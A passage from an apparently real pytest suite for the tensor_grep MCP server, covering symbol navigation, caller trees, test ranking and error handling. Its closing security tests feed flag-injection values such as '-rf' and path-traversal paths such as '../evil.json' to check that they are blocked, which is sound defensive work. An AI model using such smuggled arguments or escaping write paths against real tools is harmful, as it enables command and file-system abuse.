        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert payload["graph_completeness"] == "moderate"
    assert any(ref["provenance"] == "python-ast" for ref in payload["references"])
    assert any(ref["file"] == str(other_path.resolve()) for ref in payload["references"])


def test_tg_symbol_refs_and_callers_include_typescript_and_rust_heuristics(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "export function createInvoice(total: number) {\n"
        "  return total;\n"
        "}\n\n"
        "export function renderInvoice() {\n"
        "  return createInvoice(10);\n"
        "}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "pub fn issue_invoice() -> usize {\n"
        "    1\n"
        "}\n\n"
        "pub fn settle_invoice() -> usize {\n"
        "    issue_invoice()\n"
        "}\n",
        encoding="utf-8",
    )

    ts_refs = json.loads(mcp_server.tg_symbol_refs("createInvoice", str(project)))
    ts_callers = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))
    rust_refs = json.loads(mcp_server.tg_symbol_refs("issue_invoice", str(project)))
    rust_callers = json.loads(mcp_server.tg_symbol_callers("issue_invoice", str(project)))

    assert (
        ts_refs["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert any(ref["file"] == str(ts_path.resolve()) for ref in ts_refs["references"])
    assert any(
        ref["provenance"] in {"tree-sitter", "regex-heuristic"} for ref in ts_refs["references"]
    )
    assert any(caller["file"] == str(ts_path.resolve()) for caller in ts_callers["callers"])
    assert any(ref["file"] == str(rust_path.resolve()) for ref in rust_refs["references"])
    assert any(
        ref["provenance"] in {"tree-sitter", "regex-heuristic"} for ref in rust_refs["references"]
    )
    assert any(caller["file"] == str(rust_path.resolve()) for caller in rust_callers["callers"])


def test_tg_symbol_callers_returns_python_call_sites(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    other_path = src_dir / "billing.py"
    other_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def invoice_total():\n"
        "    return create_invoice(10, 2)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_payments.py"
    test_path.write_text(
        "from src.payments import create_invoice\n\nassert create_invoice(1, 2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("create_invoice", str(project)))

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-callers"
    assert (
        payload["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert payload["coverage"]["test_matching"] == "filename+import+graph-heuristic"
    assert any(caller["file"] == str(other_path.resolve()) for caller in payload["callers"])
    assert payload["tests"][0] == str(test_path.resolve())
    assert payload["tests"][0] == str(test_path.resolve())
    assert any(
        symbol["name"] == "create_invoice" and symbol["score"] > 0 for symbol in payload["symbols"]
    )
    assert payload["related_paths"][0] == str(module_path.resolve())
    assert str(other_path.resolve()) not in payload["related_paths"][:1]


def test_tg_symbol_callers_prefers_import_linked_typescript_tests(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "export function createInvoice(total: number) {\n"
        "  return total;\n"
        "}\n\n"
        "export function renderInvoice() {\n"
        "  return createInvoice(10);\n"
        "}\n",
        encoding="utf-8",
    )
    ts_test_path = tests_dir / "invoice_flow.spec.ts"
    ts_test_path.write_text(
        'import { createInvoice } from "../src/payments";\n'
        "test('invoice', () => expect(createInvoice(1)).toBe(1));\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    assert payload["coverage"]["test_matching"] == "filename+import+graph-heuristic"
    assert any(caller["file"] == str(ts_path.resolve()) for caller in payload["callers"])
    assert payload["tests"][0] == str(ts_test_path.resolve())


def test_tg_symbol_blast_radius_returns_transitive_call_tree(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice(total):\n    return total + 1\n", encoding="utf-8")
    service_path = src_dir / "service.py"
    service_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def build_invoice(total):\n"
        "    return create_invoice(total)\n",
        encoding="utf-8",
    )
    api_path = src_dir / "api.py"
    api_path.write_text(
        "from src.service import build_invoice\n\n"
        "def post_invoice(total):\n"
        "    return build_invoice(total)\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "test_api.py"
    test_path.write_text(
        "from src.api import post_invoice\n\n"
        "def test_post_invoice():\n"
        "    assert post_invoice(2) == 3\n",
        encoding="utf-8",
    )

    payload = json.loads(
        mcp_server.tg_symbol_blast_radius("create_invoice", str(project), max_depth=2)
    )

    assert payload["routing_backend"] == "RepoMap"
    assert payload["routing_reason"] == "symbol-blast-radius"
    assert (
        payload["coverage"]["symbol_navigation"]
        == "parser-backed-refs-callers:go-javascript-python-rust-typescript+foundational-defs-imports-only:c-cpp-csharp-java-php"
    )
    assert payload["symbol"] == "create_invoice"
    assert payload["max_depth"] == 2
    assert payload["definitions"][0]["file"] == str(module_path.resolve())
    assert payload["definitions"][0]["provenance"] == "python-ast"
    assert any(caller["file"] == str(service_path.resolve()) for caller in payload["callers"])
    assert any(caller["provenance"] == "python-ast" for caller in payload["callers"])
    assert payload["files"][0] == str(module_path.resolve())
    assert str(service_path.resolve()) in payload["files"]
    assert str(api_path.resolve()) in payload["files"]
    assert payload["tests"][0] == str(test_path.resolve())
    assert any(level["depth"] == 0 for level in payload["caller_tree"])
    assert any(level["depth"] == 1 for level in payload["caller_tree"])
    assert all("graph-derived" in level["provenance"] for level in payload["caller_tree"])
    assert all(level["graph_completeness"] == "moderate" for level in payload["caller_tree"])
    assert all(
        level["edge_summary"]["edge_kind"] == "reverse-import" for level in payload["caller_tree"]
    )
    assert all("confidence" in level["edge_summary"] for level in payload["caller_tree"])
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["graph_trust_summary"]["depth_count"] >= 1
    assert "graph-derived" in payload["graph_trust_summary"]["provenance"]
    assert "Depth 0:" in payload["rendered_caller_tree"]


# --- M11: uniform exception sanitization -- a KeyError/AttributeError must return a
# structured error, not propagate a raw traceback out of the MCP call. ---


def test_tg_symbol_blast_radius_returns_structured_error_on_unexpected_exception(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.build_symbol_blast_radius",
        side_effect=KeyError("boom"),
    ):
        out = mcp_server.tg_symbol_blast_radius("create_invoice", str(tmp_path))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"
    assert payload["error"]["retryable"] is False
    assert "boom" in payload["error"]["message"]


def test_tg_symbol_blast_radius_render_returns_structured_error_on_unexpected_exception(
    tmp_path,
    monkeypatch,
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.build_symbol_blast_radius_render",
        side_effect=AttributeError("boom"),
    ):
        out = mcp_server.tg_symbol_blast_radius_render("create_invoice", str(tmp_path))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"
    assert payload["error"]["retryable"] is False


def test_tg_repo_map_returns_structured_error_on_unexpected_exception(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.build_repo_map",
        side_effect=KeyError("boom"),
    ):
        out = mcp_server.tg_repo_map(str(tmp_path))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"
    assert payload["error"]["retryable"] is False


def test_tg_context_pack_returns_structured_error_on_unexpected_exception(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.build_context_pack",
        side_effect=KeyError("boom"),
    ):
        out = mcp_server.tg_context_pack("add", str(tmp_path))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"
    assert payload["error"]["retryable"] is False


def test_tg_agent_capsule_returns_structured_error_on_unexpected_exception(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.agent_capsule.build_agent_capsule",
        side_effect=KeyError("boom"),
    ):
        out = mcp_server.tg_agent_capsule("add", str(tmp_path))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"


def test_tg_session_edit_plan_returns_structured_error_on_unexpected_exception(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    (src_dir / "sample.py").write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    with patch(
        "tensor_grep.cli.session_store.session_context_edit_plan",
        side_effect=KeyError("boom"),
    ):
        out = mcp_server.tg_session_edit_plan(session_id, "add", str(project))

    payload = json.loads(out)
    assert payload["error"]["code"] == "internal_error"
    assert payload["session_id"] == session_id


def test_tg_symbol_impact_can_rank_tests_through_transitive_import_chain(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    payments_path = src_dir / "payments.ts"
    payments_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    workflow_path = src_dir / "workflow.ts"
    workflow_path.write_text(
        'import { createInvoice } from "./payments";\n\n'
        "export function runWorkflow() {\n"
        "  return createInvoice(1);\n"
        "}\n",
        encoding="utf-8",
    )
    ui_path = src_dir / "ui.ts"
    ui_path.write_text(
        'import { runWorkflow } from "./workflow";\n\n'
        "export function renderInvoice() {\n"
        "  return runWorkflow();\n"
        "}\n",
        encoding="utf-8",
    )
    test_path = tests_dir / "ui_flow.spec.ts"
    test_path.write_text(
        'import { renderInvoice } from "../src/ui";\n'
        "test('invoice', () => expect(renderInvoice()).toBe(1));\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_impact("createInvoice", str(project)))

    assert payload["tests"][0] == str(test_path.resolve())
    assert payload["test_matches"][0]["path"] == str(test_path.resolve())
    assert "test-graph" in payload["test_matches"][0]["reasons"]
    assert payload["test_matches"][0]["association"]["edge_kind"] in {"import-graph", "hybrid"}
    assert payload["test_matches"][0]["association"]["confidence"] in {"strong", "moderate"}


def test_tg_context_pack_prefers_more_central_importers_over_tied_leaf_importers(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    module_path = src_dir / "payments.py"
    module_path.write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    central_path = src_dir / "z_billing.py"
    central_path.write_text(
        "from src.payments import create_invoice\n\n"
        "def invoice_total():\n"
        "    return create_invoice(1, 2)\n",
        encoding="utf-8",
    )
    leaf_path = src_dir / "a_cli.py"
    leaf_path.write_text(
        "from src.payments import create_invoice\n\ndef run():\n    return create_invoice(2, 3)\n",
        encoding="utf-8",
    )
    ui_path = src_dir / "ui.py"
    ui_path.write_text(
        "from src.z_billing import invoice_total\n\ndef render():\n    return invoice_total()\n",
        encoding="utf-8",
    )
    api_path = src_dir / "api.py"
    api_path.write_text(
        "from src.z_billing import invoice_total\n\ndef serve():\n    return invoice_total()\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_context_pack("create invoice", str(project)))

    assert payload["files"].index(str(central_path.resolve())) < payload["files"].index(
        str(leaf_path.resolve())
    )
    central_match = next(
        item for item in payload["file_matches"] if item["path"] == str(central_path.resolve())
    )
    leaf_match = next(
        item for item in payload["file_matches"] if item["path"] == str(leaf_path.resolve())
    )
    assert "graph-centrality" in central_match["reasons"]
    assert central_match["graph_score"] > leaf_match["graph_score"]


def test_tg_symbol_impact_orders_tests_by_graph_score(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    (src_dir / "payments.py").write_text(
        "def create_invoice(total, tax):\n    return total + tax\n",
        encoding="utf-8",
    )
    (src_dir / "z_billing.py").write_text(
        "from src.payments import create_invoice\n\n"
        "def invoice_total():\n"
        "    return create_invoice(1, 2)\n",
        encoding="utf-8",
    )
    (src_dir / "a_cli.py").write_text(
        "from src.payments import create_invoice\n\ndef run():\n    return create_invoice(2, 3)\n",
        encoding="utf-8",
    )
    (src_dir / "ui.py").write_text(
        "from src.z_billing import invoice_total\n\ndef render():\n    return invoice_total()\n",
        encoding="utf-8",
    )
    ui_test = tests_dir / "test_ui_flow.py"
    ui_test.write_text(
        "from src.ui import render\n\ndef test_render():\n    assert render() == 3\n",
        encoding="utf-8",
    )
    cli_test = tests_dir / "test_cli_flow.py"
    cli_test.write_text(
        "from src.a_cli import run\n\ndef test_run():\n    assert run() == 5\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_impact("create_invoice", str(project)))

    ui_match = next(
        item for item in payload["test_matches"] if item["path"] == str(ui_test.resolve())
    )
    cli_match = next(
        item for item in payload["test_matches"] if item["path"] == str(cli_test.resolve())
    )
    ordered_by_score = [
        item["path"]
        for item in sorted(
            payload["test_matches"],
            key=lambda item: (-float(item["graph_score"]), str(item["path"])),
        )
    ]
    assert payload["tests"] == ordered_by_score
    assert cli_match["graph_score"] > ui_match["graph_score"]
    assert "graph-derived" in cli_match["association"]["provenance"]
    assert cli_match["association"]["confidence"] in {"strong", "moderate"}


def test_tg_symbol_callers_uses_parser_backed_javascript_calls_not_string_noise(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    api_path = src_dir / "payments.js"
    api_path.write_text(
        "export function createInvoice(total) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.js"
    consumer_path.write_text(
        'import { createInvoice } from "./payments";\n'
        'const note = "createInvoice(1)";\n'
        "// createInvoice(2)\n"
        "export function renderInvoice() {\n"
        "  return createInvoice(3);\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    consumer_calls = [
        caller for caller in payload["callers"] if caller["file"] == str(consumer_path.resolve())
    ]
    assert len(consumer_calls) == 1
    assert consumer_calls[0]["line"] == 5


def test_tg_symbol_callers_uses_parser_backed_typescript_calls_not_string_noise(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    api_path = src_dir / "payments.ts"
    api_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.ts"
    consumer_path.write_text(
        'import { createInvoice } from "./payments";\n'
        'const note: string = "createInvoice(1)";\n'
        "// createInvoice(2)\n"
        "export function renderInvoice() {\n"
        "  return createInvoice(3);\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    consumer_calls = [
        caller for caller in payload["callers"] if caller["file"] == str(consumer_path.resolve())
    ]
    assert len(consumer_calls) == 1
    assert consumer_calls[0]["line"] == 5


def test_tg_symbol_callers_uses_parser_backed_rust_calls_not_string_noise(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    api_path = src_dir / "billing.rs"
    api_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.rs"
    consumer_path.write_text(
        'const NOTE: &str = "issue_invoice()";\n'
        "// issue_invoice();\n"
        "pub fn render_invoice() -> usize {\n"
        "    issue_invoice()\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("issue_invoice", str(project)))

    consumer_calls = [
        caller for caller in payload["callers"] if caller["file"] == str(consumer_path.resolve())
    ]
    assert len(consumer_calls) == 1
    assert consumer_calls[0]["line"] == 4


def test_tg_symbol_callers_resolves_javascript_namespace_import_aliases(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    api_path = src_dir / "payments.js"
    api_path.write_text(
        "export function createInvoice(total) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.js"
    consumer_path.write_text(
        'import * as paymentsApi from "./payments";\n'
        "export function renderInvoice() {\n"
        "  return paymentsApi.createInvoice(3);\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    consumer_calls = [
        caller for caller in payload["callers"] if caller["file"] == str(consumer_path.resolve())
    ]
    assert len(consumer_calls) == 1
    assert consumer_calls[0]["line"] == 3


def test_tg_symbol_callers_resolves_rust_module_alias_use_chains(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    api_path = src_dir / "billing.rs"
    api_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.rs"
    consumer_path.write_text(
        "use crate::billing as billing_api;\n\n"
        "pub fn render_invoice() -> usize {\n"
        "    billing_api::issue_invoice()\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("issue_invoice", str(project)))

    consumer_calls = [
        caller for caller in payload["callers"] if caller["file"] == str(consumer_path.resolve())
    ]
    assert len(consumer_calls) == 1
    assert consumer_calls[0]["line"] == 4


def test_tg_symbol_callers_prefers_typescript_definition_selected_by_namespace_import(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    admin_dir = src_dir / "admin"
    src_dir.mkdir(parents=True)
    admin_dir.mkdir()

    preferred_path = src_dir / "payments.ts"
    preferred_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    other_path = admin_dir / "payments.ts"
    other_path.write_text(
        "export function createInvoice(total: number) {\n  return total * 2;\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.ts"
    consumer_path.write_text(
        'import * as paymentsApi from "./payments";\n'
        "export function renderInvoice() {\n"
        "  return paymentsApi.createInvoice(3);\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    assert len(payload["definitions"]) == 1
    assert payload["definitions"][0]["name"] == "createInvoice"
    assert payload["definitions"][0]["kind"] == "function"
    assert payload["definitions"][0]["file"] == str(preferred_path.resolve())
    assert payload["definitions"][0]["line"] == 1
    assert any(caller["file"] == str(consumer_path.resolve()) for caller in payload["callers"])
    assert all(
        definition["file"] != str(other_path.resolve()) for definition in payload["definitions"]
    )


def test_tg_symbol_callers_prefers_rust_definition_selected_by_module_alias_use_chain(
    tmp_path, monkeypatch
):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    other_dir = src_dir / "other"
    src_dir.mkdir(parents=True)
    other_dir.mkdir()

    preferred_path = src_dir / "billing.rs"
    preferred_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )
    other_path = other_dir / "billing.rs"
    other_path.write_text(
        "pub fn issue_invoice() -> usize {\n    2\n}\n",
        encoding="utf-8",
    )
    consumer_path = src_dir / "consumer.rs"
    consumer_path.write_text(
        "use crate::billing as billing_api;\n\n"
        "pub fn render_invoice() -> usize {\n"
        "    billing_api::issue_invoice()\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("issue_invoice", str(project)))

    assert len(payload["definitions"]) == 1
    assert payload["definitions"][0]["name"] == "issue_invoice"
    assert payload["definitions"][0]["kind"] == "function"
    assert payload["definitions"][0]["file"] == str(preferred_path.resolve())
    assert payload["definitions"][0]["line"] == 1
    assert any(caller["file"] == str(consumer_path.resolve()) for caller in payload["callers"])
    assert all(
        definition["file"] != str(other_path.resolve()) for definition in payload["definitions"]
    )


def test_tg_symbol_callers_prefers_typescript_tests_importing_direct_callers(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "payments.ts"
    module_path.write_text(
        "export function createInvoice(total: number) {\n  return total;\n}\n",
        encoding="utf-8",
    )
    ui_path = src_dir / "ui.ts"
    ui_path.write_text(
        'import { createInvoice } from "./payments";\n'
        "export function renderInvoice() {\n"
        "  return createInvoice(3);\n"
        "}\n",
        encoding="utf-8",
    )
    cli_path = src_dir / "cli.ts"
    cli_path.write_text(
        'import { renderInvoice } from "./ui";\n'
        "export function runCli() {\n"
        "  return renderInvoice();\n"
        "}\n",
        encoding="utf-8",
    )
    ui_test = tests_dir / "ui_flow.spec.ts"
    ui_test.write_text(
        'import { renderInvoice } from "../src/ui";\n'
        'test("invoice", () => expect(renderInvoice()).toBe(3));\n',
        encoding="utf-8",
    )
    cli_test = tests_dir / "cli_flow.spec.ts"
    cli_test.write_text(
        'import { runCli } from "../src/cli";\n'
        'test("invoice cli", () => expect(runCli()).toBe(3));\n',
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("createInvoice", str(project)))

    assert payload["tests"].index(str(ui_test.resolve())) < payload["tests"].index(
        str(cli_test.resolve())
    )


def test_tg_symbol_callers_prefers_rust_tests_importing_direct_callers(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    tests_dir = project / "tests"
    src_dir.mkdir(parents=True)
    tests_dir.mkdir()

    module_path = src_dir / "billing.rs"
    module_path.write_text(
        "pub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )
    ui_path = src_dir / "ui.rs"
    ui_path.write_text(
        "use crate::billing::issue_invoice;\n\n"
        "pub fn render_invoice() -> usize {\n"
        "    issue_invoice()\n"
        "}\n",
        encoding="utf-8",
    )
    cli_path = src_dir / "cli.rs"
    cli_path.write_text(
        "use crate::ui::render_invoice;\n\npub fn run_cli() -> usize {\n    render_invoice()\n}\n",
        encoding="utf-8",
    )
    ui_test = tests_dir / "ui_flow.rs"
    ui_test.write_text(
        "use crate::ui::render_invoice;\n\n"
        "#[test]\n"
        "fn renders_invoice() {\n"
        "    assert_eq!(render_invoice(), 1);\n"
        "}\n",
        encoding="utf-8",
    )
    cli_test = tests_dir / "cli_flow.rs"
    cli_test.write_text(
        "use crate::cli::run_cli;\n\n"
        "#[test]\n"
        "fn runs_invoice_cli() {\n"
        "    assert_eq!(run_cli(), 1);\n"
        "}\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_symbol_callers("issue_invoice", str(project)))

    assert payload["tests"].index(str(ui_test.resolve())) < payload["tests"].index(
        str(cli_test.resolve())
    )


def test_tg_symbol_source_ignores_comment_noise_for_typescript_and_rust(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)

    ts_path = src_dir / "payments.ts"
    ts_path.write_text(
        "// export function createInvoice() {}\n"
        "export function createInvoice(total: number) {\n"
        "  return total;\n"
        "}\n",
        encoding="utf-8",
    )
    rust_path = src_dir / "billing.rs"
    rust_path.write_text(
        "// pub fn issue_invoice() -> usize { 0 }\npub fn issue_invoice() -> usize {\n    1\n}\n",
        encoding="utf-8",
    )

    ts_payload = json.loads(mcp_server.tg_symbol_source("createInvoice", str(project)))
    rust_payload = json.loads(mcp_server.tg_symbol_source("issue_invoice", str(project)))

    assert ts_payload["sources"][0]["file"] == str(ts_path.resolve())
    assert ts_payload["sources"][0]["start_line"] == 2
    assert "return total;" in ts_payload["sources"][0]["source"]

    assert rust_payload["sources"][0]["file"] == str(rust_path.resolve())
    assert rust_payload["sources"][0]["start_line"] == 2
    assert "1" in rust_payload["sources"][0]["source"]


# --- round-3 security: native-argv flag-injection sentinel -------------------------
#
# The MCP rewrite/index-search tools build a native `tg` command that ends with the
# user-controlled pattern (and path) as trailing positionals. Without an end-of-options
# `--` sentinel, a pattern beginning with `-` is parsed by the native binary as a flag
# (`error: unexpected argument '--weird' found`) — flag/argv injection AND a latent
# correctness break. Verified against the real binary: `tg search -- --weird PATH` and
# `tg run --lang python --rewrite bar --json -- -x PATH` both parse the value literally.


def test_index_search_command_ends_options_before_user_positionals() -> None:
    from tensor_grep.cli import mcp_server

    with patch.object(mcp_server, "resolve_native_tg_binary", return_value=Path("/fake/tg")):
        cmd = mcp_server._build_index_search_command(pattern="--weird", path="/tmp/x")

    assert "--" in cmd, "user positionals must follow an end-of-options sentinel"
    sentinel = cmd.index("--")
    # Everything after `--` is the untrusted pattern/path, in order, and nothing else.
    assert cmd[sentinel + 1 :] == ["--weird", "/tmp/x"]


def test_rewrite_command_ends_options_before_user_positionals() -> None:
    from tensor_grep.cli import mcp_server

    with patch.object(mcp_server, "resolve_native_tg_binary", return_value=Path("/fake/tg")):
        cmd = mcp_server._build_rewrite_command(
            pattern="-x",
            replacement="bar",
            lang="python",
            path="/tmp/x",
            mode="plan",
        )

    assert "--" in cmd, "user positionals must follow an end-of-options sentinel"
    sentinel = cmd.index("--")
    assert cmd[sentinel + 1 :] == ["-x", "/tmp/x"]


def test_rewrite_apply_command_still_sentinels_positionals() -> None:
    # The apply mode adds flags (--apply/--verify/--json); the sentinel must still sit
    # immediately before the pattern/path so those flags are unaffected but the user
    # positionals cannot be re-interpreted as flags.
    from tensor_grep.cli import mcp_server

    with patch.object(mcp_server, "resolve_native_tg_binary", return_value=Path("/fake/tg")):
        cmd = mcp_server._build_rewrite_command(
            pattern="-rf",
            replacement="bar",
            lang="python",
            path="/tmp/x",
            mode="apply",
            verify=True,
        )

    assert cmd[-3:] == ["--", "-rf", "/tmp/x"]
    assert "--apply" in cmd and "--json" in cmd


# --- round-4 security: MCP write-path confinement (arbitrary file write) -----------
#
# tg_ruleset_scan (write_baseline/write_suppressions) and tg_review_bundle_create
# (output_path) forwarded LLM-supplied paths straight to disk with no confinement —
# an arbitrary-file-write primitive reachable from any MCP client. Writes must stay
# within a per-tool anchor (scan root / cwd) and fail closed otherwise.


def test_confine_write_path_refuses_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    anchor = tmp_path / "proj"
    anchor.mkdir()
    with pytest.raises(ValueError):
        mcp_server._confine_write_path("../evil.json", anchor, label="write_baseline")
    with pytest.raises(ValueError):
        mcp_server._confine_write_path(str(tmp_path / "evil.json"), anchor, label="write_baseline")
    ok = mcp_server._confine_write_path("baseline.json", anchor, label="write_baseline")
    assert ok == (anchor.resolve() / "baseline.json")
    ok2 = mcp_server._confine_write_path("sub/dir/base.json", anchor, label="x")
    assert ok2 == (anchor.resolve() / "sub" / "dir" / "base.json")


def test_ruleset_scan_refuses_write_baseline_escape(tmp_path):
    from tensor_grep.cli import mcp_server

    scan_root = tmp_path / "proj"
    scan_root.mkdir()
    (scan_root / "a.py").write_text("x = 1\n", encoding="utf-8")
    escape = tmp_path / "evil_baseline.json"
    out = mcp_server.tg_ruleset_scan(
        ruleset="secrets-basic", path=str(scan_root), write_baseline=str(escape)
    )
    parsed = json.loads(out)
    assert parsed.get("error", {}).get("code") == "invalid_input"
    assert not escape.exists()  # fail closed: nothing written outside the scan root


def test_review_bundle_create_refuses_output_path_escape(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    proj = tmp_path / "proj"
    proj.mkdir()
    manifest = proj / "manifest.json"
    manifest.write_text("{}", encoding="utf-8")
    monkeypatch.chdir(proj)  # cwd = the project anchor
    escape = tmp_path / "evil_bundle.json"
    out = mcp_server.tg_review_bundle_create(manifest_path=str(manifest), output_path=str(escape))
    parsed = json.loads(out)
